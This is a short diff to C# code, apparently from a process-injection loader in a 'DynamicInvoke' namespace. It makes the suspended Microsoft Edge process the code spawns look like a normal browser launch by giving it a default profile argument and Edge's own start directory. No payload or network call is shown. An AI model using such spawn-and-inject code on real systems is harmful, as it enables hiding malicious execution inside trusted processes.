@@ -7,7 +7,8 @@ namespace DynamicInvoke
     {
         // spawn MSEdge
         public static string ProcessToSpawn = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
-        public static string ProcessArgs = @"";
+        public static string ProcessArgs = "--profile-directory=Default";
+        public static string startDir = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application";
 
         public static void Main(string[] args)
         {
@@ -50,7 +51,7 @@ namespace DynamicInvoke
             STRUCTS.SECURITY_ATTRIBUTES lpa = new STRUCTS.SECURITY_ATTRIBUTES();
             STRUCTS.SECURITY_ATTRIBUTES lta = new STRUCTS.SECURITY_ATTRIBUTES();
 
-            bool result = CreateProcess(ProcessToSpawn, ProcessArgs, ref lpa, ref lta, false, STRUCTS.ProcessCreationFlags.CREATE_NEW_CONSOLE | STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, "C:\\Windows\\System32\\", ref si, out pi);
+            bool result = CreateProcess(ProcessToSpawn, ProcessArgs, ref lpa, ref lta, false, STRUCTS.ProcessCreationFlags.CREATE_NEW_CONSOLE | STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, startDir, ref si, out pi);
 
 #if DEBUG
             Console.WriteLine("[*] Process ID: {0}", pi.dwProcessId);
